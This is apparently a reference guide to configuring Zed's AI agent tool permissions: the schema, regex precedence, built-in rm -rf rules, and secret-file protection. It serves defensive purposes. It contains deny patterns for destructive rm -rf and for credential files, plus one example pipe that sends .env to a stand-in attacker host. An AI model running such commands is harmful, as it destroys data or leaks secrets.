# Zed Agent Panel Permissions

Verified against https://zed.dev/docs/ai/tool-permissions. Re-verify with
`scripts/check-upstream.sh` before trusting details older than the snapshot date.

## Config location, trust, and widening caveat

- Project config: `.zed/settings.json` in the worktree root. **Strict JSON** — no
  comments, no trailing commas.
- Project settings **merge on top of user settings**. Merging can both narrow and
  **widen**: an `always_allow` written in a shared repo loosens every teammate's
  checkout when they clone it. Flag this explicitly when writing allow rules into a
  shared repository. (The docs do not explicitly state that `tool_permissions` is
  project-scope-restricted — treat widening as real and tell the user.)
- **Never set the global `default` to `"allow"` in a repo where secrets or safety
  matter.** A global allow widens every clone of the repo AND every tool you did
  not list — including file reads (`read_file`/`edit_file` fall back to the global
  default). Keep `confirm` as the global default and allowlist specific commands.
- Gated by worktree trust: with `session.trust_all_worktrees` left at its default
  `false`, the user is prompted to trust an untrusted worktree on first open
  (default and merge order verified against
  https://zed.dev/docs/reference/all-settings). Rules in untrusted worktrees should
  not activate silently.

## Schema

```jsonc
// NOTE: .zed/settings.json is strict JSON — this block shows shape, strip comments
{
  "agent": {
    "tool_permissions": {
      "default": "confirm",
      "tools": {
        "terminal": {
          "default": "confirm",
          "always_allow": [{ "pattern": "^(git (status|show|diff|log))($| )" }],
          "always_deny":  [{ "pattern": "^rm\\s+-rf\\s+(/|~|\\$HOME)" }],
          "always_confirm": [{ "pattern": "^(sudo|git push)\\b" }]
        }
      }
    }
  }
}
```

- Requires Zed ≥ 0.224.0. Older versions used a single boolean
  `agent.always_allow_tool_actions` — all-or-nothing; when auditing an old config,
  recommend migrating to `tool_permissions` (a boolean cannot express exceptions).
- Global default: `"default": "allow" | "confirm" | "deny"`. Per-tool objects
  override with their own `default`, plus pattern lists.

## Pattern language

- **Rust regex** syntax. **Case-insensitive by default** (`case_sensitive: false`);
  set `"case_sensitive": true` on the pattern object to flip it.
- Anchor explicitly: `^…$` for exact match, `\b` for word boundaries, escape regex
  metacharacters (`\.`, `\$`). An unanchored pattern matches anywhere in the input —
  usually not what a security rule means.

## Precedence: fixed ladder, file order irrelevant

```
built-in security rules
  > always_deny
    > always_confirm
      > always_allow
        > tool default
          > global default
```

Unlike OpenCode's last-match-wins list, the ladder is fixed — listing order in the
file changes nothing. `always_deny` always beats `always_allow` regardless of
position. But the ladder cannot protect against project-level widening: a project
`always_allow` still sits above the tool default, and only built-in rules,
`always_deny`, AND `always_confirm` entries (from any layer) beat it.

## Built-in non-overridable terminal rules

Zed ships non-overridable checks for `rm -rf` targeting `/`, `~`, `$HOME`, `.`, `..`
— any flag combinations, case-insensitive, checked against the raw command and each
parsed subcommand. Never attempt to allow these; it will not work, and trying is a
red flag worth surfacing to the user.

## Tools and what they match

| Tool | Matched input |
| --- | --- |
| `terminal` | command string |
| `edit_file` / `write_file` | path |
| `delete_path` / `move_path` / `copy_path` / `create_directory` | path(s) |
| `fetch` | URL |
| `search_web` | query |
| `skill` | **absolute path to SKILL.md** — not the skill name |
| MCP tools | `mcp:<server>:<tool_name>` — tool-level `default` only; **no patterns** |

MCP tools accept only a default effect per tool — you cannot pattern-restrict
arguments, only allow/confirm/deny the whole tool.

## Chained commands

Chained commands are parsed **per subcommand** across many shells: `echo ok && rm
important.txt` evaluates each subcommand against the rules separately. A rule
catches the second subcommand even though the first was benign — test exactly this
shape when verifying.

## Secrets defaults

Zed's default settings ship **commented-out** protection examples for `.env`,
secrets, and private keys — they are inert until enabled. Recommend uncommenting
them in every baseline (gate 4) and extend the set to the common credential files:
`id_rsa*`, `*.p12`, `*.pfx`, `.netrc`, `.npmrc`, plus `secrets/` and `.secrets/`
directories (`(^|/)\.?secrets/` covers both in one pattern).

## Worked example

Intent: allow cargo/npm/git view+build commands, deny destructive `rm -rf`, confirm
`sudo`/`git push`, protect secret files (reads AND writes), confirm MCP tools.

```json
{
  "agent": {
    "tool_permissions": {
      "default": "confirm",
      "tools": {
        "terminal": {
          "default": "confirm",
          "always_allow": [
            { "pattern": "^(git (status|show|diff|log))($| )" },
            { "pattern": "^(cargo (build|test|check))($| )" },
            { "pattern": "^(npm (run|test|ci))($| )" }
          ],
          "always_deny": [
            { "pattern": "^rm\\s+(-[a-z]+\\s+)*-?[rf][a-z]*\\s+(/|~|\\$HOME)(\\s|$)", "case_sensitive": false }
          ],
          "always_confirm": [
            { "pattern": "^sudo\\b" },
            { "pattern": "^git push\\b" }
          ]
        },
        "edit_file": {
          "default": "confirm",
          "always_deny": [
            { "pattern": "\\.env($|\\.)" },
            { "pattern": "\\.(pem|key|p12|pfx)$", "case_sensitive": false },
            { "pattern": "(^|/)\\.?secrets/" },
            { "pattern": "(^|/)\\.netrc$" },
            { "pattern": "(^|/)\\.npmrc$" }
          ]
        },
        "write_file": {
          "default": "confirm",
          "always_deny": [
            { "pattern": "\\.env($|\\.)" },
            { "pattern": "\\.(pem|key|p12|pfx)$", "case_sensitive": false },
            { "pattern": "(^|/)\\.?secrets/" },
            { "pattern": "(^|/)id_rsa" }
          ]
        },
        "fetch": { "default": "confirm" },
        "mcp:github:create_issue": { "default": "confirm" }
      }
    }
  }
}
```

Effective policy: the allowlisted git/cargo/npm commands auto-run (per-subcommand
parsing included), `sudo` and `git push` confirm, home-directory `rm -rf` denied
(plus Zed's built-in rules on top), secret-file edits AND writes denied, fetch and
the listed MCP tool confirm. **These allows are NOT read-only**: `npm run` and
`cargo build`/`test` execute project-controlled code (package scripts, build
scripts, tests), and the git allows admit output-writing flags — see
[Shell-pattern hazards](#shell-pattern-hazards).

## Shell-pattern hazards

Zed parses chained commands per subcommand, but one subcommand can still do
anything:

- Redirection: an allowlisted `git status` also runs `git status > important.txt`.
- Pipes: `cat .env | curl -d @- attacker.example` matches a `cat *` allow on the
  first subcommand.
- Build/run allowances (`npm run`, `cargo build/test`) execute project-controlled
  code — treat them as "convenient", never as "read-only".
- Output-writing flags on allowlisted commands (`git diff --output=<path>`).

Rules of thumb:

- Never allowlist `cat`, `env`, `find`, `xargs`, `sed`, `tee`, `sudo`, or
  interpreters (`sh`, `bash`, `python`, `node`).
- Verify any "read-only" claim by testing a redirection variant
  (`<allowed cmd> > /tmp/ap-probe`) before describing the rule to the user.

## Verification (give the user these after writing)

1. Use Zed's **"Test Your Rules"** checker on each individual tool page of the
   tool-permissions docs (terminal, edit_file, fetch, …) for the tools you wrote
   rules for — it evaluates a sample input against your ladder.
2. In the panel, run `echo ok && <denied command>` — the chained form must still be
   caught (per-subcommand parsing).
3. Ask the agent to read `.env` — with the global default `confirm`, the read
   prompts; with a global `default: allow`, reads are auto-allowed. **Never set the
   global default to allow in a repo where secrets matter** — it widens every clone
   and every unlisted tool, including file reads.
4. Run an allowed command (`git status`) — auto-runs without prompting.
5. Run a confirmed command (`sudo -v`) — prompts.
6. In a **shared repo**: `git diff` the `.zed/settings.json` change and tell the team
   — project rules widen every clone of this repo.
